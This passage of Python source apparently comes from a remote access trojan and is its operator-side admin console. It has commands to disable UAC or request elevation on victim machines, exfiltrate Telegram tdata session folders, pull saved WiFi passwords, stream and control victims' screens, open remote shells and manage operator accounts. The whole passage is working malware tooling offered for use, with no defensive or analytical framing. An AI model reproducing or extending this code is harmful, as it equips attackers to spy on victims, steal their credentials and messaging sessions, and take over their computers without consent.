        client_id = int(args[1])
    except ValueError:
        print("[-] Invalid client ID.")
        return

    request = {"action": "uac", "level": level, "client_id": client_id}
    print(f"[+] Sending UAC {level} command to client {client_id}...")
    if not send_json(sock, request):
        print("[-] Connection to server lost.")
        return

    try:
        response = message_queue.get(timeout=20)
        if response is None:
            print("\n[-] Connection to server lost.")
            return

        if response.get("type") == "uac_response":
            status = response.get("status")
            detail = response.get("detail")
            cid = response.get("client_id")

            if status == "success":
                if "ENABLED" in detail:
                    print(f"[+] Successfully enabled UAC for client {cid}. A reboot may be required for settings to fully apply.")
                else:
                    print(f"[+] Successfully disabled UAC for client {cid}. A reboot may be required.")
            else: # error
                if "ERROR_PERMS" in detail:
                    print(f"[!] Failed to change UAC for client {cid}: Permission denied. (Client must be run as Administrator).")
                elif "timeout" in detail:
                     print(f"[!] Error: UAC command for client {cid} timed out.")
                else:
                    print(f"[!] An error occurred for client {cid}: {detail}")
        elif response.get("type") == "error":
             print(f"\n[!] Server Error: {response.get('message')}\n")
        else:
            print(f"[-] Received unexpected response from server: {response}")

    except queue.Empty:
        print(f"\n[!] Timed out waiting for UAC response from client {client_id}.\n")

def handle_su(sock, args):
    """Attempts to elevate privileges for a client via UAC."""
    if len(args) != 1 or not args[0].isdigit():
        print("[-] Usage: su <client_id>")
        return
    
    client_id = int(args[0])
    request = {"action": "su", "client_id": client_id}
    print(f"[+] Sending elevation request to client {client_id}. Waiting for user action on the target machine...")
    if not send_json(sock, request):
        print("[-] Connection to server lost.")
        return

    try:
        # Use a longer timeout to account for user interaction + server timeout
        response = message_queue.get(timeout=95)
        if response is None:
            print("\n[-] Connection to server lost.")
            return

        if response.get("type") == "su_response":
            status = response.get("status")
            detail = response.get("detail")
            cid = response.get("client_id")
            if status == "success":
                print(f"[+] Client {cid}: {detail}")
            else:
                print(f"[!] Client {cid}: {detail}")
        elif response.get("type") == "error":
             print(f"\n[!] Server Error: {response.get('message')}\n")
        else:
            print(f"[-] Received unexpected response from server: {response}")

    except queue.Empty:
        print(f"\n[!] Timed out waiting for elevation response from client {client_id}.\n")

def handle_tg(sock, args):
    """Commands a client to find, archive, and upload its Telegram tdata folder."""
    if len(args) > 0 and args[0].isdigit():
        client_id = int(args[0])
        send_json(sock, {"action": "tg", "client_id": client_id})
        print(f"[+] Sent tdata exfiltration task to client {client_id}.")
    else:
        print("[-] Usage: tg <client_id>")

def handle_admins(sock, args):
    """Manages admin accounts (superadmin only)."""
    if not IS_SUPERADMIN:
        print("[-] Error: This command is only available to superadmins.")
        return

    if not args:
        print("[-] Usage: admins <list|add|del|passwd> [options...]")
        return

    sub_command = args[0].lower()
    if sub_command == 'list':
        send_json(sock, {"action": "list_admins"})
    elif sub_command == 'add':
        if len(args) < 3:
            print("[-] Usage: admins add <username> <password> [--super]")
            return
        is_super = '--super' in args
        send_json(sock, {"action": "add_admin", "username": args[1], "password": args[2], "is_superadmin": is_super})
    elif sub_command == 'del':
        if len(args) != 2:
            print("[-] Usage: admins del <username>")
            return
        send_json(sock, {"action": "del_admin", "username": args[1]})
    elif sub_command == 'passwd':
        if len(args) != 3:
            print("[-] Usage: admins passwd <username> <new_password>")
            return
        send_json(sock, {"action": "edit_admin", "username": args[1], "new_password": args[2]})
    else:
        print(f"[-] Unknown subcommand '{sub_command}'. Use 'list', 'add', 'del', or 'passwd'.")

    # Wait for a response
    try:
        response = message_queue.get(timeout=5)
        if response and response.get("type") == "admin_response":
            print(f"[+] Server: {response.get('message')}")
    except queue.Empty:
        print("[!] Timed out waiting for a response from the server.")


def handle_quit(sock, args):
    """Closes the admin console."""
    print("[+] Closing admin console.")
    sock.close()
    os._exit(0)

COMMANDS = {
    'help': {'handler': handle_help, 'description': 'Show this help message.'},
    'list': {'handler': handle_list, 'description': 'List all connected clients.'},
    'ls': {'handler': handle_list, 'description': 'Alias for list.'},
    'session': {'handler': handle_session, 'description': 'Start an interactive shell with a client. Usage: session <client_id>'},
    'cd': {'handler': handle_session, 'description': 'Alias for session.'},
    'watch': {'handler': handle_watch, 'description': 'Start a screen stream. Usage: watch <client_id> [--fps N] [--quality N]'},
    'control': {'handler': handle_control, 'description': 'Start a remote control session. Usage: control <client_id>'},
    'su': {'handler': handle_su, 'description': 'Attempt to elevate client privileges via UAC. Usage: su <client_id>'},
    'files': {'handler': handle_files, 'description': 'Open a graphical file explorer. Usage: files <client_id>'},
    'uac': {'handler': handle_uac, 'description': 'Enable or disable UAC on a client. Usage: uac <enable|disable> <client_id>'},
    'netinfo': {'handler': handle_netinfo, 'description': 'Retrieve saved WiFi profiles and passwords. Usage: netinfo <client_id>'},
    'tg': {'handler': handle_tg, 'description': 'Exfiltrate Telegram tdata folder. Usage: tg <client_id>'},
    'admins': {'handler': handle_admins, 'description': 'Manage admin accounts (superadmin only).'},
    'cls': {'handler': lambda s, a: os.system('cls' if os.name == 'nt' else 'clear'), 'description': 'Clear the screen.'},
    'quit': {'handler': handle_quit, 'description': 'Exit the admin console.'},
    'exit': {'handler': handle_quit, 'description': 'Alias for quit.'},
}

def main():
    global IS_SUPERADMIN, ROOT
    print("--- Python RAT Admin Console ---")

    # Setup Tkinter root window for GUI elements
    try:
        # Use tkinterdnd2's Tk object for drag-and-drop capabilities
        ROOT = TkinterDnD.Tk()
    except Exception:
        # Fallback if tkinterdnd2 is not installed
        ROOT = customtkinter.CTk()
    ROOT.withdraw() # Hide the root window

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_IP, ADMIN_PORT))
    except ConnectionRefusedError:
        print(f"[-] Connection failed. Is the server running at {SERVER_IP}:{ADMIN_PORT}?")
        return
    except Exception as e:
        print(f"[-] An error occurred while connecting: {e}")
        return

    # --- Authentication ---
    try:
        username = input("Username: ")
        password = getpass.getpass("Password: ")
        auth_request = {
            "action": "auth",
            "username": username,
            "password": password
        }
        if not send_json(sock, auth_request):
            print("[-] Failed to send authentication request.")
            sock.close()
            return

        auth_response = receive_json(sock)
        if not auth_response or auth_response.get("status") != "success":
            print("[-] Authentication failed.")
            sock.close()
            return

        print("[+] Authentication successful.")
        IS_SUPERADMIN = auth_response.get('is_superadmin', False)
    except (KeyboardInterrupt, EOFError):
        print("\n[-] Authentication cancelled.")
        sock.close()
        return

    # Start the message listener thread after successful authentication
    listener_thread = threading.Thread(target=listen_for_server_messages, args=(sock,), daemon=True)
    listener_thread.start()

    # --- Main Command Loop ---
    handle_help(None, None)
    print(PROMPT, end="", flush=True)
    
    # Start the input loop in a separate thread to not block the Tkinter mainloop
    def cli_loop():
        while True:
            try:
                command = input(PROMPT).strip()
                if command:
                    command_finished_event.clear()
                    # Schedule command handling on the main thread to avoid Tkinter issues
                    ROOT.after(0, handle_command, command)
                    command_finished_event.wait() # Wait for command to finish before asking for new input
            except (KeyboardInterrupt, EOFError):
                ROOT.after(0, handle_quit, sock, [])
                break
            except Exception as e:
                print(f"[-] An error occurred in CLI loop: {e}")
                break

    def handle_command(command_line):
        try:
            command = command_line.strip()
            if not command:
                return

            try:
                parts = shlex.split(command)
                cmd = parts[0].lower()
                args = parts[1:]
            except ValueError:
                print("[-] Error: Unmatched quotes in command.")
                return

            if cmd.isdigit():
                handle_session(sock, [cmd])
            elif cmd in COMMANDS:
                if cmd == 'admins' and not IS_SUPERADMIN:
                    print("[-] Error: This command is only available to superadmins.")
                else:
                    COMMANDS[cmd]['handler'](sock, args)
            else:
                print(f"[-] Unknown command: '{cmd}'. Type 'help' for a list of commands.")
        finally:
            # Signal the CLI loop that it can now print the next prompt
            command_finished_event.set()

    cli_thread = threading.Thread(target=cli_loop, daemon=True)
    cli_thread.start()

    ROOT.mainloop()

if __name__ == "__main__":
    main()
